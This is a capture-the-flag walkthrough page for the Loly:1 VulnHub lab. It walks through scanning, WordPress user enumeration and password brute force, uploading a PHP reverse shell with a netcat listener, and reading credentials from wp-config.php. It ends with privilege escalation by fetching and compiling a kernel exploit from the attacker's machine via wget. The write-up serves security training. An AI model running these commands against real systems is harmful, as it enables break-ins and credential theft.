@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Loly: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/loly-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-16T21:00:41+00:00">September 16, 2020</time><time class="updated" datetime="2025-07-10T19:04:00+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we are going to solve a Capture the Flag (CTF) challenge of LOLY:1 from Vulnhub and the URL for this CTF is <a style="color: #000000;" href="https://vulnhub.com/entry/loly-1,538/"><span style="color: #0000ff;"><strong>https://vulnhub.com/entry/loly-1,538</strong></span>/</a>. This CTF is posted by SunSCR Team and aimed for Beginners, so let’s get started…</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Dirb for Directory Listing and discovering WordPress site</span></li>
+<li><span style="color: #000000;">Running wpscan to find vulnerabilities</span></li>
+<li><span style="color: #000000;">Running wpscan to brute force password</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Uploading a php web shell in zip format</span></li>
+<li><span style="color: #000000;">Running the netcat listener</span></li>
+<li><span style="color: #000000;">Exploring the wp-config.php file</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Searching Ubuntu related exploits</span></li>
+<li><span style="color: #000000;">Exploiting Ubuntu</span></li>
+</ul>
+<h3><span style="color: #800000;">Reconnaissance</span></h3>
+<p><span style="color: #000000;">We have to set up our LAB first using a Bridge Network either in VMWare or Virtual Box (As it supports both). Then we will have to identify the target IP address by using the following netdiscover command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover -r 192.168.0.1/24</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-M-29LsLhTYM/X2J2M_vaWxI/AAAAAAAAogM/bWDymr7krHEwpGTGRDMLV3OOiMUdGh2FQCLcBGAsYHQ/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">The IP Address discovered by the above-mentioned command is 192.168.0.180. </span><span style="color: #000000;">We discovered the IP Address of our vulnerable machine and now this is the time to run and scan using nmap command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.0.180</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nVq3uCdjz_w/X2J2QLTlDHI/AAAAAAAAogQ/Ynjx5j6dGlEIU2_MIrGJLbLRLy871hb0ACLcBGAsYHQ/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">The image above shows that as a result of nmap <strong>port 80</strong> is open and running <strong>nginx</strong> server, which we will explore and enumerate further.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We will browse the site now to see how the interface feels and what is available there.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AU02NKdLaRA/X2J2T3pKfwI/AAAAAAAAogU/f0XX05Go8cwYVS-LfVuqHGm833uF2dP5wCLcBGAsYHQ/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">As we can see in the image above, the nginx server is running and the site is hosted. Now we will run the <strong>dirb</strong> command to find the existing and/or hidden Web objects.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://192.168.0.180</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dne3Hy64Ogc/X2J2WzxuwBI/AAAAAAAAogY/1745OWwh-6slRfAb8B3xFE3FqEIUcGVQQCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">From image above we can see that this is a <strong>WordPress</strong> site and we can also see the <strong>wp-admin</strong> path. </span><span style="color: #000000;">As we know the WordPress and its related plugins are prone to vulnerability so we will focus on this part to find out any low hanging fruits.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iE_dr_0sGKg/X2J2ZmAckmI/AAAAAAAAogc/pDGC-su-2k0ZU0UiT6wESYnD6_pj8Y2cACLcBGAsYHQ/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Upon browsing the site, we observed that the page is not responding as it is supposed to respond, possibly because of domain name mapping.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_Pq9nFwbsc8/X2J2c7UtVuI/AAAAAAAAogg/u7tAThFUXRAHEVEHsrUQaoa-lImOjJ3iwCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Hence, we need to add the entry in <strong>/etc/hosts</strong> file as shown in the image below. This entry will not only browse the page in an efficient way but will also help us to run <strong>wpscan</strong> on the next screen.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kM-AS_o95fk/X2J2f0yyyKI/AAAAAAAAogk/cc-6IsacvzoUjCx0frISUmLJuZ9ojLoogCLcBGAsYHQ/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Now, it’s time to run the <strong>wpscan</strong> to find more vulnerabilities in this WordPress site by using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan --url http://loly.lc/wordpress --enumerate u</pre>
+<p><span style="color: #000000;">To find out the login names of users on WordPress website, we will use the parameter <strong>–enumerate u</strong> at the end of the command, as shown in the following image:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mfSwUFc8VmA/X2J2i9ERFRI/AAAAAAAAogs/IVTus6stRbIM3XLwd6y0RQjzdWK5OwfpACLcBGAsYHQ/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">After running the <strong>wpscan</strong> we found the username which is <strong>loly</strong>, the same can be seen in the image below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KINjfYRTiEU/X2J2l9GkpnI/AAAAAAAAog0/iBGG-MJUSpAHF-7zz6Fza46dXxlfgMFsACLcBGAsYHQ/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Now, the next stage is to brute force the username <strong>loly</strong> with our Kali Linux <strong>rockyou.txt</strong> file to find the password by using the following <strong>wpscan</strong> command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt</pre>
+<p><span style="color: #000000;">Here, -U can be used for file and single user or both</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RS0_NogxaLk/X2J2pFhSsTI/AAAAAAAAog4/2rR2wcFAltgP5rYsC1drqTxTPBM46zEnwCLcBGAsYHQ/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Eureka!!! We found the password for loly, as shown in the image below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kWVCSTAuijk/X2J2seqDCmI/AAAAAAAAohA/aSbwOgCGx8ktoRI5mQs7iFJ2VTil6LrtwCLcBGAsYHQ/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Here comes the exciting part, EXPLOITATION!!! It’s time to upload the PHP reverse shell by logging into wordpress site by using the loly/fernando credentials which we discovered earlier. Make sure that first, we need to upload the reverse shell as <strong>zip</strong> format.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9aLzR7TEgVk/X2J25TguznI/AAAAAAAAohQ/xAgJnpAhTKom0FwlGjS6nXXebfVAwmAWwCLcBGAsYHQ/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Now, access the <strong>PHP reverse shell</strong> payload by browsing the site as can be seen in the image below but before that, we have to open a <strong>netcat</strong> listener as well for reverse connection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IIdx0atIq70/X2J2-2-rMGI/AAAAAAAAohY/UcXboM30jdIf5WBefI_VADZoXg0pmjCtACLcBGAsYHQ/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">As mentioned above, we need to create a netcat listener first by using the below command to get the shell</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
+<p><span style="color: #000000;">Alright!!! So we got the reverse shell, now it’s time to use the python one-liner so we have a clear view of our terminal</span></p>
+<p><span style="color: #000000;">Now, further exploring the directory structure of our victim machine. We found the <strong>wp-config.php</strong> file which will help us a lot in solving the rest of this CTF. By the way, the <strong>wp-config.php</strong> file is one of the core WordPress files which contains the information about database, name, host (typically localhost), username, and password.</span></p>
+<p><span style="color: #000000;">As you can see that we managed to see the password <strong>lolyisabeautifulgirl</strong> by viewing the <strong>wp-config.php</strong> file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3Ydd3XUDT_4/X2J3DEIcaKI/AAAAAAAAohc/O-TG4Gclba08F6f0lll0ubUJPPyUUw0DwCLcBGAsYHQ/s1600/15.png"/></span></p>
+<p><span style="color: #000000;"> So, we got the password, now we have to see what this password belongs to. To find out the users, we will list the users by running the following command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bkAer7i-prs/X2J3pfFB5kI/AAAAAAAAoiA/crk5RCwD2YANY3kIPF724X--IRQCR9b8QCLcBGAsYHQ/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">By running the above command yields the username, which is our favorite, <strong>loly</strong></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Here comes the trickier part, PRIVILEGE ESCALATION. First, we will log in by username <strong>loly</strong> and the password we discovered earlier <strong>lolyisabeautifulgirl </strong>and run the following command afterward:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsb_release -a</pre>
+<p><span style="color: #000000;">The lsb_release command displays LSB (Linux Standard Base) information about specific Linux distribution, including version number, release codename, and distributor ID.</span></p>
+<p><span style="color: #000000;">Next, we will run the <strong>uname</strong> command to know about the Linux kernel version and some other information so we should have enough evidence about the system for Privilege Escalation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname –a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_eAa4J11ByE/X2J30GyyfRI/AAAAAAAAoiI/iCFzr1fVjf8eVipkZYI1EkFAAMBSy4CJQCLcBGAsYHQ/s1600/17.png"/></span></p>
+<p>As we know that the screenshot above shows Ubuntu 4.4.0 as the Linux Image version, our next step is to find the exploit related to this version by using the command below</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">seachsploit ubuntu 4.4.0</pre>
+<p><span style="color: #000000;">The image below shows the exploits that are available for this particular Linux version and our command used to copy the exploit under the root directory. </span><span style="color: #000000;">We will run the python server to host our exploit copied earlier by using the command below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O6BZ7wXeuTY/X2J4C60LkHI/AAAAAAAAoiQ/uize20iSbAknE4VkZ8C26nFBE2rU_DFbACLcBGAsYHQ/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Now, switch back to our victim machine and run the following command from <strong>tmp</strong> folder to save the exploit hosted on our Kali machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://192.168.0.147:8000/45010.c</pre>
+<h5><span style="color: #000000;">Run the following command to compile the exploit we copied earlier.</span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gcc 45010.c -o shell</pre>
+<p><span style="color: #000000;">We will use the <strong>chmod</strong> command to make the file readable, writable, and executable.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 shell</pre>
+<p><span style="color: #000000;">The <strong>id</strong> command below revealed the real and effective user and group IDs and we can see that we are running the system as root as per the below image.</span></p>
+<p><span style="color: #000000;">Now, cd to the root folder and see if there is any <strong>root.txt</strong> available, which is correct in our case. By using the command <strong>cat root.txt</strong> we can see our final flag just like it is shown in the image below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oyIztOMflWU/X2J4PmucMNI/AAAAAAAAoiU/SjpScr89-oYb9XCojMZsiSbDs2Viyz72QCLcBGAsYHQ/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong></p>
+<p><span style="color: #000000;"><strong>Author</strong></span>: Mukarram Ali is a Risk Specialist with an Insurance Company based in Canada. Contact on <a href="https://www.linkedin.com/in/mukarram-ali-27a62410/"><strong>Linkedin</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
